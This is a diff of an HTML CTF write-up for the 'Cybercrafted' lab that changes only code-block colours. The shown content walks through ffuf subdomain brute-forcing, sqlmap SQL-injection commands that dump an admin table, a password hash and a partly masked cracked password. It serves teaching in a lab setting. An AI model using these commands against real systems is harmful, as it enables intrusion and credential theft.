@@ -48,7 +48,7 @@
 &lt;/li&gt;
 &lt;/ul&gt;
 &lt;p&gt;Found a bunch of subdomains using ffuf.&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ffuf -w /opt/wordlists/raft-medium-words.txt:SUBS -H &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Host: SUBS.cybercrafted.thm&amp;#34;&lt;/span&gt; -u http://10.10.212.240 -fs &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ffuf -w /opt/wordlists/raft-medium-words.txt:SUBS -H &lt;span style=&#34;color:#0086d2&#34;&gt;&amp;#34;Host: SUBS.cybercrafted.thm&amp;#34;&lt;/span&gt; -u http://10.10.212.240 -fs &lt;span style=&#34;color:#0086f7;font-weight:bold&#34;&gt;0&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;pre&gt;&lt;code&gt;Subs Found:
 admin                   [Status: 200, Size: 937, Words: 218, Lines: 31, Duration: 99ms]
 store                   [Status: 403, Size: 287, Words: 20, Lines: 10, Duration: 100ms]
@@ -65,7 +65,7 @@ index                   [Status: 200, Size: 937, Words: 218, Lines: 31, Duration
 &lt;ul&gt;
 &lt;li&gt;Found Search Engine At &lt;a href=&#34;http://store.cybercrafted.thm/search.php&#34;&gt;http://store.cybercrafted.thm/search.php&lt;/a&gt;&lt;/li&gt;
 &lt;/ul&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ffuf -w /opt/wordlists/raft-medium-words.txt:FILE -u http://store.cybercrafted.thm/FILE.php -mc 200,302
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ffuf -w /opt/wordlists/raft-medium-words.txt:FILE -u http://store.cybercrafted.thm/FILE.php -mc 200,302
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;pre&gt;&lt;code&gt;search                  [Status: 200, Size: 838, Words: 162, Lines: 28, Duration: 106ms]
 &lt;/code&gt;&lt;/pre&gt;
 &lt;h3 id=&#34;interesting-discoveries&#34; &gt;Interesting Discoveries
@@ -89,14 +89,14 @@ Using Sqlmap to automate exploitation of our sql injecetion .&lt;/p&gt;
 &lt;ul&gt;
 &lt;li&gt;
 &lt;p&gt;Tables (Database: Webapp)&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sqlmap -u http://store.cybercrafted.thm/search.php --data &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;search=*&amp;amp;submit=&amp;#34;&lt;/span&gt; --tables
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sqlmap -u http://store.cybercrafted.thm/search.php --data &lt;span style=&#34;color:#0086d2&#34;&gt;&amp;#34;search=*&amp;amp;submit=&amp;#34;&lt;/span&gt; --tables
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;| :&amp;mdash;   |
 | admin  |
 | stock  |&lt;/p&gt;
 &lt;/li&gt;
 &lt;li&gt;
 &lt;p&gt;Columns (Table Admin)&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sqlmap -u http://store.cybercrafted.thm/search.php --data &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;search=*&amp;amp;submit=&amp;#34;&lt;/span&gt; --tamper&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;space2comment -D webapp -T admin --columns --threads&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sqlmap -u http://store.cybercrafted.thm/search.php --data &lt;span style=&#34;color:#0086d2&#34;&gt;&amp;#34;search=*&amp;amp;submit=&amp;#34;&lt;/span&gt; --tamper=space2comment -D webapp -T admin --columns --threads=&lt;span style=&#34;color:#0086f7;font-weight:bold&#34;&gt;10&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;table&gt;
 &lt;thead&gt;
 &lt;tr&gt;
@@ -124,7 +124,7 @@ Using Sqlmap to automate exploitation of our sql injecetion .&lt;/p&gt;
 &lt;p&gt;Columns Dump&lt;/p&gt;
 &lt;/li&gt;
 &lt;/ul&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sqlmap -u http://store.cybercrafted.thm/search.php --data &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;search=*&amp;amp;submit=&amp;#34;&lt;/span&gt; --tamper&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;space2comment -D webapp -T admin --dump --threads&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt; 
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sqlmap -u http://store.cybercrafted.thm/search.php --data &lt;span style=&#34;color:#0086d2&#34;&gt;&amp;#34;search=*&amp;amp;submit=&amp;#34;&lt;/span&gt; --tamper=space2comment -D webapp -T admin --dump --threads=&lt;span style=&#34;color:#0086f7;font-weight:bold&#34;&gt;10&lt;/span&gt; 
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;pre&gt;&lt;code&gt;| id | hash                                     | user                |
 |:---|------------------------------------------|---------------------|
 | 1  | 88b949dd5cdfbeAAAAAAAAbfa24e5974234e7c01 | xXUltimateCreeperXx |
@@ -143,7 +143,7 @@ Using Sqlmap to automate exploitation of our sql injecetion .&lt;/p&gt;
 &lt;/h3&gt;&lt;ul&gt;
 &lt;li&gt;
 &lt;p&gt;Password Hash Cracked thanks to &lt;span style=&#34;color:blue&#34;&gt;&lt;em&gt;crackstation&lt;/em&gt;&lt;/span&gt;&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-json&#34; data-lang=&#34;json&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;xXUltimateCreeperXx&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;diamondAAAAAAAA&amp;#34;&lt;/span&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-json&#34; data-lang=&#34;json&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;&amp;#34;xXUltimateCreeperXx&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#0086d2&#34;&gt;&amp;#34;diamondAAAAAAAA&amp;#34;&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
 &lt;/ul&gt;
 &lt;h3 id=&#34;command-execution&#34; &gt;Command Execution
